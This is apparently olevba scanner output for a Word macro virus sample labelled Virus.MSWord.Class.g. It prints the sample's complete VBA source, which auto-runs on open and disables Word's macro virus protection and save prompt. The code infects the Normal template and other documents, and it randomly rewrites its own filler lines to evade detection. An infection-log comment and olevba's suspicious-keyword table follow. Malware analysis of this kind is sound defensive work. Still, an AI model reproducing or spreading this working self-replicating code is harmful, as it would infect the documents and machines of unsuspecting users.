olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.g-65fd485dbd789028c9453f622cd5182a5c10c985
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.g-65fd485dbd789028c9453f622cd5182a5c10c985 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
P141oM = Gti9 + Aji82
On Error GoTo out
S153iI = Vgy10 + Uro118
Options.VirusProtection = False
K197tN = Out182 + Shn45
Options.SaveNormalPrompt = False
P20eF = Lxe20 + Ozn159
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
G32yG = Itf32 + Vrt129
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
J91qP = Hmv181 + Eny52
If nt > 40 And ad > 0 Then GoTo out
R138rG = Umm182 + Jxn166
If nt < 40 Then
A80oU = Jlo53 + Lps11
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
F125eB = Irp108 + Dpu31
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
U166lL = Ixi3 + Kjm42
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), "' I infected " & Application.UserName & " on: " & Now
B16xH = Czo38 + Ooh135
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials
J92sD = Pfo98 + Bjr41
End If
H150xM = Dfx54 + Jtg134
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
F68yA = Hit8 + Fpu96
host.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
E82gM = Qfs192 + Lym22
host.CodeModule.deletelines 1, 4
U69mH = Dpv109 + Vxz184
If nt < 40 Then host.CodeModule.replaceline 1, "Sub AutoClose()"
L82rS = Slk139 + Vsp35
With host.CodeModule
J136oR = Lqo177 + Fmp74
    For x = 2 To 48 Step 2
G38tD = Lvn136 + Hgp149
    .replaceline x, (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 200) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200)
N75iD = Rve92 + Byi23
    Next x
C150wB = Pon79 + Epj180
End With
Q160yN = Pzq139 + Ite83
out:
Q37tH = Jfx15 + Osx86
If nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
V27oK = Vvr103 + Ito193
End Sub

' Class.Poppy.Gold Infection Log
' ------------------------------
' I infected DIRTY PC on: 10/30/98 12:25:22 PM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

